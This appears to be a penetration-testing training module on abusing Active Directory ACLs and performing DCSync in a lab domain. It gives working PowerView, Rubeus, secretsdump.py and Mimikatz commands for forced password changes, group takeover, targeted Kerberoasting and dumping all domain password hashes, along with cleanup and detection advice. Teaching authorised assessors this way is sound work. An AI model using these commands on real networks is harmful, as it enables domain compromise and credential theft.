
For security reasons, not all users and computers in an AD environment can access all objects and files. These types of permissions are controlled through Access Control Lists (ACLs). Posing a serious threat to the security posture of the domain, a slight misconfiguration to an ACL can leak permissions to other objects that do not need it.

Access Control List (ACL) Overview
In their simplest form, ACLs are lists that define a) who has access to which asset/resource and b) the level of access they are provisioned.

The settings themselves in an ACL are called Access Control Entries (ACEs)

Each ACE maps back to a user, group, or process (also known as security principals) and defines the rights granted to that principal.

Every object has an ACL, but can have multiple ACEs because multiple security principals can access objects in AD. ACLs can also be used for auditing access within AD.

There are two types of ACLs:

Discretionary Access Control List (DACL) - defines which security principals are granted or denied access to an object. DACLs are made up of ACEs that either allow or deny access. When someone attempts to access an object, the system will check the DACL for the level of access that is permitted. If a DACL does not exist for an object, all who attempt to access the object are granted full rights. If a DACL exists, but does not have any ACE entries specifying specific security settings, the system will deny access to all users, groups, or processes attempting to access it.

System Access Control Lists (SACL) - allow administrators to log access attempts made to secured objects.

We see the ACL for the user account forend in the image below. Each item under Permission entries makes up the DACL for the user account, while the individual entries (such as Full Control or Change Password) are ACE entries showing rights granted over this user object to various users and groups.

Viewing forend's ACL


Viewing the SACLs through the Auditing Tab


Access Control Entries (ACEs)
As stated previously, Access Control Lists (ACLs) contain ACE entries that name a user or group and the level of access they have over a given securable object. There are three main types of ACEs that can be applied to all securable objects in AD:

ACE

Description

Access denied ACE

Used within a DACL to show that a user or group is explicitly denied access to an object

Access allowed ACE

Used within a DACL to show that a user or group is explicitly granted access to an object

System audit ACE

Used within a SACL to generate audit logs when a user or group attempts to access an object. It records whether access was granted or not and what type of access occurred

Each ACE is made up of the following four components:

The security identifier (SID) of the user/group that has access to the object (or principal name graphically)

A flag denoting the type of ACE (access denied, allowed, or system audit ACE)

A set of flags that specify whether or not child containers/objects can inherit the given ACE entry from the primary or parent object

An access mask which is a 32-bit value that defines the rights granted to an object

When access control lists are checked to determine permissions, they are checked from top to bottom until an access denied is found in the list.

Why are ACEs Important?
Attackers utilize ACE entries to either further access or establish persistence. These can be great for us as penetration testers as many organizations are unaware of the ACEs applied to each object or the impact that these can have if applied incorrectly.

They cannot be detected by vulnerability scanning tools, and often go unchecked for many years, especially in large and complex environments.

Some example Active Directory object security permissions are as follows. These can be enumerated (and visualized) using a tool such as BloodHound, and are all abusable with PowerView, among other tools:

ForceChangePassword abused with Set-DomainUserPassword

Add Members abused with Add-DomainGroupMember

GenericAll abused with Set-DomainUserPassword or Add-DomainGroupMember

GenericWrite abused with Set-DomainObject

WriteOwner abused with Set-DomainObjectOwner

WriteDACL abused with Add-DomainObjectACL

AllExtendedRights abused with Set-DomainUserPassword or Add-DomainGroupMember

Addself abused with Add-DomainGroupMember

This graphic, adapted from a graphic created by Charlie Bromberg (Shutdown), shows an excellent breakdown of the varying possible ACE attacks and the tools to perform these attacks from both Windows and Linux (if applicable).


We will run into many other interesting ACEs (privileges) in Active Directory from time to time. The methodology for enumerating possible ACL attacks using tools such as BloodHound and PowerView and even built-in AD management tools should be adaptable enough to assist us whenever we encounter new privileges in the wild that we may not yet be familiar with.

For example, we may import data into BloodHound and see that a user we have control over (or can potentially take over) has the rights to read the password for a Group Managed Service Account (gMSA) through the ReadGMSAPassword edge. In this case, there are tools such as GMSAPasswordReader that we could use, along with other methods, to obtain the password for the service account in question. Other times we may come across extended rights such as Unexpire-Password or Reanimate-Tombstones using PowerView and have to do a bit of research to figure out how to exploit these for our benefit.

It's worth familiarizing yourself with all of the BloodHound edges and as many Active Directory Extended Rights as possible as you never know when you may encounter a less common one during an assessment.

ACL Attacks in the Wild
We can use ACL attacks for:

Lateral movement

Privilege escalation

Persistence

Some common attack scenarios may include:

Attack
Description
Abusing forgot password permissions

Help Desk and other IT users are often granted permissions to perform password resets and other privileged tasks. If we can take over an account with these privileges (or an account in a group that confers these privileges on its users), we may be able to perform a password reset for a more privileged account in the domain.

Abusing group membership management

It's also common to see Help Desk and other staff that have the right to add/remove users from a given group. It is always worth enumerating this further, as sometimes we may be able to add an account that we control into a privileged built-in AD group or a group that grants us some sort of interesting privilege.

Excessive user rights

We also commonly see user, computer, and group objects with excessive rights that a client is likely unaware of. This could occur after some sort of software install (Exchange, for example, adds many ACL changes into the environment at install time) or some kind of legacy or accidental configuration that gives a user unintended rights. Sometimes we may take over an account that was given certain rights out of convenience or to solve a nagging problem more quickly.

There are many other possible attack scenarios in the world of Active Directory ACLs, but these three are the most common. We will cover enumerating these rights in various ways, performing the attacks, and cleaning up after ourselves.

Some ACL attacks can be considered "destructive," such as changing a user's password or performing other modifications within a client's AD domain. If in doubt, it's always best to run a given attack by our client before performing it to have written documentation of their approval in case an issue arises. We should always carefully document our attacks from start to finish and revert any changes. This data should be included in our report, but we should also highlight any changes we make clearly so that the client can go back and verify that our changes were indeed reverted properly.

ACL Enumeration
Enumerating ACLs with PowerView
Copy
Import-Module .\PowerView.ps1
Using Find-InterestingDomainAcl

Copy
Find-InterestingDomainAcl
If we try to dig through all of this data during a time-boxed assessment, we will likely never get through it all or find anything interesting before the assessment is over. Now, there is a way to use a tool such as PowerView more effectively -- by performing targeted enumeration starting with a user that we have control over.

We first need to get the SID of our target user to search effectively.

Copy
$sid = Convert-NameToSid <username>
We can then use the Get-DomainObjectACL function to perform our targeted search.

In the below example, we are using this function to find all domain objects that our user has rights over by mapping the user's SID using the $sid variable to the SecurityIdentifier property which is what tells us who has the given right over an object.

One important thing to note is that if we search without the flag ResolveGUIDs, we will see results like the below, where the right ExtendedRight does not give us a clear picture. This is because the ObjectAceType property is returning a GUID value that is not human readable.

Note that this command will take a while to run, especially in a large environment.

Using Get-DomainObjectACL

Copy
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
We could Google for the GUID value 00299570-246d-11d0-a768-00aa006e0529 and uncover this page showing that the user has the right to force change the other user's password. Alternatively, we could do a reverse search using PowerShell to map the right name back to the GUID value.

Performing a Reverse Search & Mapping to a GUID Value

Copy
$guid= "00299570-246d-11d0-a768-00aa006e0529"
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
This gave us our answer, but would be highly inefficient during an assessment. PowerView has the ResolveGUIDs flag, which does this very thing for us. Notice how the output changes when we include this flag to show the human-readable format of the ObjectAceType property as User-Force-Change-Password.

Using the -ResolveGUIDs Flag

Copy
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
It is essential that we understand what our tools are doing and have alternative methods in our toolkit in case a tool fails or is blocked. Before moving on, let's take a quick look at how we could do this using the Get-Acl and Get-ADUser cmdlets which we may find available to us on a client system.

Knowing how to perform this type of search without using a tool such as PowerView is greatly beneficial and could set us apart from our peers. We may be able to use this knowledge to achieve results when a client has us work from one of their systems, and we are restricted down to what tools are readily available on the system without the ability to pull in any of our own.

Creating a List of Domain Users

Copy
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
We then read each line of the file using a foreach loop, and use the Get-Acl cmdlet to retrieve ACL information for each domain user by feeding each line of the ad_users.txt file to the Get-ADUser cmdlet. We then select just the Access property, which will give us information about access rights. Finally, we set the IdentityReference property to the user we are in control of (or looking to see what rights they have), in our case, wley.

A Useful foreach Loop

Copy
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
Once we have this data, we could follow the same methods shown above to convert the GUID to a human-readable format to understand what rights we have over the target user.

So, to recap, we started with the user wley and now have control over the user damundsen via the User-Force-Change-Password extended right. Let's use Powerview to hunt for where, if anywhere, control over the damundsen account could take us.

Further Enumeration of Rights Using damundsen

Copy
$sid2 = Convert-NameToSid damundsen
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
Investigating Group inheritance

Copy
Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
Investigating the Information Technology Group

Copy
$itgroupsid = Convert-NameToSid "Information Technology"
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose
Looking for Interesting Access From User

Copy
$adunnsid = Convert-NameToSid adunn
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose
The output (for example) shows that our adunn user has DS-Replication-Get-Changes and DS-Replication-Get-Changes-In-Filtered-Set rights over the domain object. This means that this user can be leveraged to perform a DCSync attack. We will cover this attack in-depth in the DCSync section.

SID to Username
Copy
Get-Aduser -identity SID
Enumerating ACLs with BloodHound
Let's take the data we gathered earlier with the SharpHound ingestor and upload it to BloodHound.

Next, we can set the wley user as our starting node, select the Node Info tab and scroll down to Outbound Control Rights.

If we click on the 1 next to First Degree Object Control, we see the first set of rights that we enumerated, ForceChangePassword over the damundsen user.

If we right-click on the line between the two objects, a menu will pop up. If we select Help, we will be presented with help around abusing this ACE, including:

More info on the specific right, tools, and commands that can be used to pull off this attack

Operational Security (Opsec) considerations

External references.

Investigating ForceChangePassword Further

If we click on the 16 next to Transitive Object Control, we will see the entire path that we painstakingly enumerated above.

Finally, we can use the pre-built queries in BloodHound to confirm that the adunn user has DCSync rights.

ACL Abuse Tactics
Example Scenario
Once again, to recap where we are and where we want to get to. We are in control of the wley user whose NTLMv2 hash we retrieved by running Responder earlier in the assessment. Lucky for us, this user was using a weak password, and we were able to crack the hash offline using Hashcat and retrieve the cleartext value. We know that we can use this access to kick off an attack chain that will result in us taking control of the adunn user who can perform the DCSync attack, which would give us full control of the domain by allowing us to retrieve the NTLM password hashes for all users in the domain and escalate privileges to Domain/Enterprise Admin and even achieve persistence. To perform the attack chain, we have to do the following:

Use the wley user to change the password for the damundsen user

Authenticate as the damundsen user and leverage GenericWrite rights to add a user that we control to the Help Desk Level 1 group

Take advantage of nested group membership in the Information Technology group and leverage GenericAll rights to take control of the adunn user

Creating a PSCredential Object

Copy
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
Next, we must create a SecureString object which represents the password we want to set for the target user damundsen.

Creating a SecureString Object

Copy
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
Finally, we'll use the Set-DomainUserPassword PowerView function to change the user's password. We need to use the -Credential flag with the credential object we created for the wley user. It's best to always specify the -Verbose flag to get feedback on the command completing as expected or as much information about errors as possible. We could do this from a Linux attack host using a tool such as pth-net, which is part of the pth-toolkit.

Changing the User's Password

Copy
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
Next, we need to perform a similar process to authenticate as the damundsen user and add ourselves to the Help Desk Level 1 group.

Copy
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 
Next, we can use the Add-DomainGroupMember function to add ourselves to the target group. We can first confirm that our user is not a member of the target group. This could also be done from a Linux host using the pth-toolkit.

Adding damundsen to the Help Desk Level 1 Group

Copy
Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
Confirming damundsen was Added to the Group

Copy
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
At this point, we should be able to leverage our new group membership to take control over the adunn user. Now, let's say that our client permitted us to change the password of the damundsen user, but the adunn user is an admin account that cannot be interrupted. Since we have GenericAll rights over this account, we can have even more fun and perform a targeted Kerberoasting attack by modifying the account's servicePrincipalName attribute to create a fake SPN that we can then Kerberoast to obtain the TGS ticket and (hopefully) crack the hash offline using Hashcat.

We must be authenticated as a member of the Information Technology group for this to be successful. Since we added damundsen to the Help Desk Level 1 group, we inherited rights via nested group membership. We can now use Set-DomainObject to create the fake SPN.

We could use the tool targetedKerberoast to perform this same attack from a Linux host, and it will create a temporary SPN, retrieve the hash, and delete the temporary SPN all in one command.

Creating a Fake SPN

Copy
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
Kerberoasting with Rubeus

Copy
.\Rubeus.exe kerberoast /user:adunn /nowrap
Great! We have successfully obtained the hash. The last step is to attempt to crack the password offline using Hashcat. Once we have the cleartext password, we could now authenticate as the adunn user and perform the DCSync attack, which we will cover in the next section.

Cleanup
In terms of cleanup, there are a few things we need to do:

Remove the fake SPN we created on the adunn user.

Remove the damundsen user from the Help Desk Level 1 group

Set the password for the damundsen user back to its original value (if we know it) or have our client set it/alert the user

This order is important because if we remove the user from the group first, then we won't have the rights to remove the fake SPN.

Removing the Fake SPN from adunn's Account

Copy
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
Removing damundsen from the Help Desk Level 1 Group

Copy
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
Confirming damundsen was Removed from the Group

Copy
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
Detection and Remediation
A few recommendations around ACLs include:

Auditing for and removing dangerous ACLs

Monitor group membership

Audit and monitor for ACL changes

Enabling the Advanced Security Audit Policy can help in detecting unwanted changes, especially Event ID 5136: A directory service object was modified which would indicate that the domain object was modified, which could be indicative of an ACL attack.

DCSync
Let's dig deeper into this attack and go through examples of leveraging it for full domain compromise from both a Linux and a Windows attack host.

What is DCSync and How Does it Work?
DCSync is a technique for stealing the Active Directory password database by using the built-in Directory Replication Service Remote Protocol, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.

The crux of the attack is requesting a Domain Controller to replicate passwords via the DS-Replication-Get-Changes-All extended right. This is an extended access control right within AD, which allows for the replication of secret data.

To perform this attack, you must have control over an account that has the rights to perform domain replication (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set). Domain/Enterprise Admins and default domain administrators have this right by default.


Using Get-ObjectAcl to Check adunn's Replication Rights

Copy
$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
If we had certain rights over the user (such as WriteDacl), we could also add this privilege to a user under our control, execute the DCSync attack, and then remove the privileges to attempt to cover our tracks.

DCSync replication can be performed using tools such as Mimikatz, Invoke-DCSync, and Impacket’s secretsdump.py.

Running the tool as below will write all hashes to files with the prefix inlanefreight_hashes. The -just-dc flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file.

Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py (from Linux)

Copy
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
We can use the -just-dc-ntlm flag if we only want NTLM hashes or specify -just-dc-user <USERNAME> to only extract data for a specific user.

Other useful options include -pwd-last-set to see when each account's password was last changed and -history if we want to dump password history, which may be helpful for offline password cracking or as supplemental data on domain password strength metrics for our client.

The -user-status is another helpful flag to check and see if a user is disabled.

We can dump the NTDS data with this flag and then filter out disabled users when providing our client with password cracking statistics to ensure that data such as:

Number and % of passwords cracked

top 10 passwords

Password length metrics

Password re-use

reflect only active user accounts in the domain.

If we check the files created using the -just-dc flag, we will see that there are three: one containing the NTLM hashes, one containing Kerberos keys, and one that would contain cleartext passwords from the NTDS for any accounts set with reversible encryption enabled.

Viewing an Account with Reversible Encryption Password Storage Set


When this option is set on a user account, it does not mean that the passwords are stored in cleartext. Instead, they are stored using RC4 encryption. The trick here is that the key needed to decrypt them is stored in the registry (the Syskey) and can be extracted by a Domain Admin or equivalent.

Any passwords set on accounts with this setting enabled will be stored using reversible encryption until they are changed. We can enumerate this using the Get-ADUser cmdlet:

Enumerating Further using Get-ADUser

Copy
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
We can see that one account, proxyagent, has the reversible encryption option set with PowerView as well:

Checking for Reversible Encryption Option using Get-DomainUser

Copy
 Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
We can perform the attack with Mimikatz as well. Using Mimikatz, we must target a specific user. Here we will target the built-in administrator account. We could also target the krbtgt account and use this to create a Golden Ticket for persistence, but that is outside the scope of this module.

Also it is important to note that Mimikatz must be ran in the context of the user who has DCSync privileges. We can utilize runas.exe to accomplish this:

Using runas.exe

Copy
runas /netonly /user:INLANEFREIGHT\adunn powershell
Performing the Attack with Mimikatz

Copy
.\mimikatz.exe

privilege::debug
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator